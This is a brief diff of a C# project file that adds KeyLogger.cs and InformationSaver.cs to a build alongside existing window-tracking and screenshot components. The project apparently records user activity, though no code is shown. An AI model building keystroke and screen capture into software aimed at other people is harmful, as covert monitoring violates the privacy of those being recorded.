@@ -82,6 +82,8 @@
       <SubType>Designer</SubType>
     </ApplicationDefinition>
     <Compile Include="ForegroundWindowSaver.cs" />
+    <Compile Include="InformationSaver.cs" />
+    <Compile Include="KeyLogger.cs" />
     <Compile Include="ScreenshotMaker.cs" />
     <Compile Include="TimeManager.cs" />
     <Compile Include="Window1.xaml.cs">
